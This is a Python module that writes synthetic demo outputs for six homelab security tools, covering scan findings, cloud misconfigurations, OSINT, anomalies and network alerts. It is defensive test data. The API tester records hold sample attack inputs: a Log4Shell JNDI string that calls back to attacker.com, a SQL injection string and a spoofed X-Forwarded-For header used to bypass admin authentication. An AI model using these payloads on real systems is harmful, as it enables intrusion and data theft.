"""
Generates synthetic JSON outputs for all 6 homelab tools.

Key shared entities across tool outputs (ensures real DBSCAN clustering):
  - IP 10.0.0.55 : SPECTRE (open ports), Network Monitor (port scan), OSINT (Shodan service)
  - IP 203.0.113.5: Network Monitor (exfil destination), OSINT (known bad hosting)
  - CVE-2021-44228 : SPECTRE (Log4Shell port 8080) + API Tester description
  - Domain corp.internal : SPECTRE target, OSINT, API Tester
"""

from __future__ import annotations

import json
import os
import tempfile
from pathlib import Path


# ---------------------------------------------------------------------------
# SPECTRE — vulnerability scanner output
# ---------------------------------------------------------------------------
SPECTRE_DATA = {
    "target": "10.0.0.55",
    "port_range": "1-10000",
    "scan_time": "2026-03-24T08:00:00Z",
    "ports": {
        "22":   {"service": "ssh",   "state": "open"},
        "80":   {"service": "http",  "state": "open"},
        "443":  {"service": "https", "state": "open"},
        "8080": {"service": "java-rmi", "state": "open"},
        "3306": {"service": "mysql", "state": "open"},
    },
    "banners": {
        "22":   "SSH-2.0-OpenSSH_7.4",
        "80":   "Apache httpd 2.4.49",
        "8080": "Apache Tomcat/9.0.37 (Log4j 2.14.1)",
        "3306": "MySQL 5.7.36-log",
    },
    "cves": {
        "80": [
            {"id": "CVE-2021-41773", "severity": "HIGH",
             "description": "Path traversal in Apache HTTP Server 2.4.49"},
        ],
        "8080": [
            {"id": "CVE-2021-44228", "severity": "CRITICAL",
             "description": "Log4Shell — remote code execution via JNDI injection in Log4j 2.x"},
            {"id": "CVE-2021-45046", "severity": "CRITICAL",
             "description": "Log4j2 incomplete fix for CVE-2021-44228"},
        ],
        "3306": [
            {"id": "CVE-2021-2307", "severity": "MEDIUM",
             "description": "MySQL privilege escalation via symlink attack"},
        ],
    },
}

# ---------------------------------------------------------------------------
# NIMBUS — cloud security scanner output
# ---------------------------------------------------------------------------
NIMBUS_DATA = {
    "metadata": {
        "scan_time": "2026-03-24T08:05:00Z",
        "provider": "aws",
        "account_id": "123456789012",
    },
    "findings": [
        {
            "rule_id": "S3-001",
            "provider": "aws",
            "resource_type": "S3Bucket",
            "resource_id": "corp-backup-bucket",
            "region": "us-east-1",
            "severity": "critical",
            "status": "FAIL",
            "title": "S3 bucket publicly accessible",
            "description": "Bucket 'corp-backup-bucket' has public read ACL enabled. Sensitive backup data is exposed.",
            "remediation": "Disable public ACL and enable Block Public Access settings.",
            "cis_benchmark": "2.1.1",
        },
        {
            "rule_id": "IAM-003",
            "provider": "aws",
            "resource_type": "IAMUser",
            "resource_id": "admin-user",
            "region": "global",
            "severity": "high",
            "status": "FAIL",
            "title": "IAM user with no MFA enabled",
            "description": "IAM user 'admin-user' has console access but no MFA configured.",
            "remediation": "Enable MFA for all IAM users with console access.",
            "cis_benchmark": "1.10",
        },
        {
            "rule_id": "SG-002",
            "provider": "aws",
            "resource_type": "SecurityGroup",
            "resource_id": "sg-0a1b2c3d4e5f",
            "region": "us-east-1",
            "severity": "high",
            "status": "FAIL",
            "title": "Security group allows unrestricted inbound SSH (0.0.0.0/0)",
            "description": "Security group sg-0a1b2c3d4e5f allows SSH (port 22) from any IP address.",
            "remediation": "Restrict SSH access to known management IPs.",
            "cis_benchmark": "5.2",
        },
        {
            "rule_id": "CT-001",
            "provider": "aws",
            "resource_type": "CloudTrail",
            "resource_id": "management-trail",
            "region": "us-east-1",
            "severity": "medium",
            "status": "FAIL",
            "title": "CloudTrail logging disabled",
            "description": "CloudTrail trail 'management-trail' is not logging API calls.",
            "remediation": "Enable CloudTrail logging across all regions.",
            "cis_benchmark": "3.1",
        },
        {
            "rule_id": "RDS-005",
            "provider": "aws",
            "resource_type": "RDSInstance",
            "resource_id": "prod-db-01",
            "region": "us-east-1",
            "severity": "medium",
            "status": "FAIL",
            "title": "RDS instance not encrypted at rest",
            "description": "RDS instance 'prod-db-01' does not have encryption at rest enabled.",
            "remediation": "Enable RDS encryption using AWS KMS.",
            "cis_benchmark": "2.3.1",
        },
        {
            "rule_id": "S3-002",
            "provider": "aws",
            "resource_type": "S3Bucket",
            "resource_id": "corp-logs-bucket",
            "region": "us-east-1",
            "severity": "low",
            "status": "FAIL",
            "title": "S3 bucket versioning not enabled",
            "description": "Bucket 'corp-logs-bucket' does not have versioning enabled.",
            "remediation": "Enable S3 versioning to protect against accidental deletion.",
            "cis_benchmark": "2.1.3",
        },
        {
            "rule_id": "IAM-012",
            "provider": "aws",
            "resource_type": "IAMPolicy",
            "resource_id": "dev-team-policy",
            "region": "global",
            "severity": "high",
            "status": "FAIL",
            "title": "IAM policy grants overly permissive S3 access",
            "description": "Policy 'dev-team-policy' grants s3:* on resource arn:aws:s3:::*",
            "remediation": "Apply least-privilege and restrict S3 actions to required buckets.",
            "cis_benchmark": "1.16",
        },
    ],
    "provider_scores": {"aws": {"overall": 4.2}},
}

# ---------------------------------------------------------------------------
# OSINT Framework output
# ---------------------------------------------------------------------------
OSINT_DATA = {
    "meta": {
        "target": "corp.internal",
        "generated_at": "2026-03-24T08:10:00Z",
        "framework_version": "1.0",
    },
    "organisation": {
        "name": "Corp Internal Ltd",
        "emails": ["admin@corp.internal", "it@corp.internal"],
        "employees": 340,
    },
    "infrastructure": {
        "subdomains": ["mail.corp.internal", "vpn.corp.internal", "dev.corp.internal"],
        "services": [
            {"ip": "10.0.0.55", "port": 8080, "banner": "Apache Tomcat (Log4j)", "source": "shodan"},
            {"ip": "203.0.113.5", "port": 443, "banner": "nginx/1.18.0", "source": "shodan"},
        ],
        "dns_records": [
            {"type": "A", "name": "corp.internal", "value": "10.0.0.55"},
            {"type": "A", "name": "mail.corp.internal", "value": "10.0.0.10"},
        ],
    },
    "breach_exposure": {
        "total_breaches": 4,
        "breaches": [
            {
                "name": "LinkedIn 2021",
                "breach_date": "2021-06-22",
                "data_classes": ["Email addresses", "Names", "Phone numbers"],
                "affected_count": 700000000,
            },
            {
                "name": "RockYou2021",
                "breach_date": "2021-06-04",
                "data_classes": ["Passwords", "Email addresses"],
                "affected_count": 8400000000,
            },
            {
                "name": "Collection #1",
                "breach_date": "2019-01-07",
                "data_classes": ["Email addresses", "Passwords"],
                "affected_count": 700000000,
            },
            {
                "name": "Canva 2019",
                "breach_date": "2019-05-24",
                "data_classes": ["Email addresses", "Names", "Passwords", "Usernames"],
                "affected_count": 137272116,
            },
        ],
        "paste_exposure": 3,
    },
    "risk_assessment": {
        "overall_score": 7.4,
        "findings": [
            {
                "title": "Critical service exposed on internet-facing IP",
                "severity": "critical",
                "description": (
                    "IP 10.0.0.55 is internet-facing with Log4j-vulnerable Tomcat on port 8080. "
                    "CVE-2021-44228 is actively exploited in the wild."
                ),
            },
            {
                "title": "Known bad actor hosting detected",
                "severity": "high",
                "description": (
                    "IP 203.0.113.5 is associated with known malicious hosting. "
                    "Outbound connections to this IP indicate potential exfiltration or C2."
                ),
            },
            {
                "title": "Credential breach exposure",
                "severity": "high",
                "description": (
                    "Organisation email domain found in 4 public breach datasets. "
                    "Credentials likely available to threat actors."
                ),
            },
            {
                "title": "Subdomain enumeration risk",
                "severity": "medium",
                "description": (
                    "3 subdomains discovered via passive enumeration: "
                    "mail.corp.internal, vpn.corp.internal, dev.corp.internal"
                ),
            },
        ],
    },
}

# ---------------------------------------------------------------------------
# API Security Tester output
# ---------------------------------------------------------------------------
API_TESTER_DATA = [
    {
        "scanner": "sqli_scanner",
        "target": "http://10.0.0.55/api/users",
        "scan_time": "2026-03-24T08:15:00Z",
        "findings": [
            {
                "title": "SQL Injection in /api/users",
                "severity": "critical",
                "description": "The 'id' parameter is vulnerable to SQL injection. Attacker can dump database.",
                "evidence": "GET /api/users?id=1' OR '1'='1 → 200 OK, 340 rows returned",
                "attack_explanation": "Classic UNION-based SQL injection bypassing authentication",
            },
        ],
    },
    {
        "scanner": "auth_scanner",
        "target": "http://10.0.0.55/admin",
        "scan_time": "2026-03-24T08:15:30Z",
        "findings": [
            {
                "title": "Authentication bypass on /admin panel",
                "severity": "critical",
                "description": "Admin panel accessible without valid session when X-Forwarded-For header is spoofed.",
                "evidence": "GET /admin with X-Forwarded-For: 127.0.0.1 returns 200 with admin dashboard",
                "attack_explanation": "Header injection bypasses IP allowlist check",
            },
        ],
    },
    {
        "scanner": "idor_scanner",
        "target": "http://10.0.0.55/api/orders",
        "scan_time": "2026-03-24T08:16:00Z",
        "findings": [
            {
                "title": "IDOR on /api/orders/{id}",
                "severity": "high",
                "description": "Order IDs are sequential integers. Any authenticated user can access any order.",
                "evidence": "GET /api/orders/1 with user2 session returns user1 order details",
                "attack_explanation": "Insecure Direct Object Reference — no ownership check on order resource",
            },
        ],
    },
    {
        "scanner": "log4shell_scanner",
        "target": "http://10.0.0.55:8080/login",
        "scan_time": "2026-03-24T08:17:00Z",
        "findings": [
            {
                "title": "Log4Shell (CVE-2021-44228) confirmed on port 8080",
                "severity": "critical",
                "description": (
                    "Active exploitation of CVE-2021-44228 confirmed. "
                    "JNDI callback received from 10.0.0.55 indicating RCE possible."
                ),
                "evidence": "User-Agent: ${jndi:ldap://attacker.com/a} triggered DNS callback",
                "attack_explanation": "Log4j 2.x JNDI injection leads to remote code execution",
            },
        ],
    },
]

# ---------------------------------------------------------------------------
# Anomaly Detector output
# ---------------------------------------------------------------------------
ANOMALY_DATA = [
    {
        "timestamp": "2026-03-24T02:14:33Z",
        "label": "off-hours login attempt",
        "event_type": "authentication",
        "src_ip": "203.0.113.5",
        "username": "admin",
        "hour_of_day": 2,
        "day_of_week": 1,
        "login_attempts": 47,
        "anomaly_score": -0.72,
        "prediction": -1,
        "is_anomaly": True,
    },
    {
        "timestamp": "2026-03-24T02:47:11Z",
        "label": "unusual source IP login",
        "event_type": "authentication",
        "src_ip": "203.0.113.5",
        "username": "svc-backup",
        "hour_of_day": 2,
        "day_of_week": 1,
        "login_attempts": 1,
        "anomaly_score": -0.88,
        "prediction": -1,
        "is_anomaly": True,
    },
    {
        "timestamp": "2026-03-24T03:05:22Z",
        "label": "guest account anomaly",
        "event_type": "authentication",
        "src_ip": "10.0.0.55",
        "username": "guest",
        "hour_of_day": 3,
        "day_of_week": 1,
        "login_attempts": 1,
        "anomaly_score": -0.61,
        "prediction": -1,
        "is_anomaly": True,
    },
    {
        "timestamp": "2026-03-24T08:00:00Z",
        "label": "normal business login",
        "event_type": "authentication",
        "src_ip": "10.0.0.100",
        "username": "alice",
        "hour_of_day": 8,
        "day_of_week": 2,
        "login_attempts": 1,
        "anomaly_score": 0.05,
        "prediction": 1,
        "is_anomaly": False,
    },
]

# ---------------------------------------------------------------------------
# Network Baseline Monitor output
# ---------------------------------------------------------------------------
NETWORK_MONITOR_DATA = {
    "generated_at": "2026-03-24T08:20:00Z",
    "windows": [
        {
            "window_id": 1,
            "start_time": "2026-03-24T02:00:00Z",
            "end_time": "2026-03-24T02:05:00Z",
            "total_packets": 12450,
            "total_bytes": 54000000,
            "unique_src_ips": 8,
        }
    ],
    "alerts": [
        {
            "rule": "port_scan_detected",
            "level": "high",
            "timestamp": "2026-03-24T02:01:12Z",
            "message": (
                "Port scan detected: 10.0.0.55 probed 847 ports on internal subnet "
                "in under 60 seconds — likely reconnaissance activity."
            ),
            "detail": {
                "src_ip": "10.0.0.55",
                "dst_ip": "10.0.0.0/24",
                "ports_probed": 847,
                "duration_seconds": 58,
            },
        },
        {
            "rule": "large_outbound_transfer",
            "level": "high",
            "timestamp": "2026-03-24T02:14:05Z",
            "message": (
                "Large outbound transfer: 47 MB sent from 10.0.0.55 to external IP 203.0.113.5 "
                "(port 443) — possible data exfiltration."
            ),
            "detail": {
                "src_ip": "10.0.0.55",
                "dst_ip": "203.0.113.5",
                "dst_port": 443,
                "bytes_transferred": 49283072,
                "duration_seconds": 312,
            },
        },
        {
            "rule": "lateral_movement_detected",
            "level": "high",
            "timestamp": "2026-03-24T02:47:30Z",
            "message": (
                "Lateral movement detected: unusual peer-to-peer connections between internal hosts "
                "10.0.0.55 → 10.0.0.20 → 10.0.0.30 on port 445 (SMB)."
            ),
            "detail": {
                "src_ip": "10.0.0.55",
                "dst_ip": "10.0.0.20",
                "port": 445,
                "protocol": "SMB",
            },
        },
        {
            "rule": "icmp_flood",
            "level": "medium",
            "timestamp": "2026-03-24T03:02:00Z",
            "message": (
                "ICMP flood from 10.0.0.55: 14,200 ICMP echo requests/sec — "
                "possible DoS or network mapping."
            ),
            "detail": {
                "src_ip": "10.0.0.55",
                "dst_ip": "10.0.0.1",
                "icmp_rate": 14200,
            },
        },
    ],
}


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

ALL_DATASETS = {
    "spectre": SPECTRE_DATA,
    "nimbus": NIMBUS_DATA,
    "osint": OSINT_DATA,
    "api_tester": API_TESTER_DATA,
    "anomaly": ANOMALY_DATA,
    "network_monitor": NETWORK_MONITOR_DATA,
}


def write_demo_files(output_dir: str | None = None) -> dict[str, str]:
    """
    Write synthetic tool JSON files to *output_dir* (or a temp dir).
    Returns {tool_name: filepath}.
    """
    if output_dir is None:
        output_dir = tempfile.mkdtemp(prefix="sentinel-demo-")
    else:
        os.makedirs(output_dir, exist_ok=True)

    paths: dict[str, str] = {}
    for tool, data in ALL_DATASETS.items():
        out_path = os.path.join(output_dir, f"{tool}_demo.json")
        with open(out_path, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
        paths[tool] = out_path

    return paths
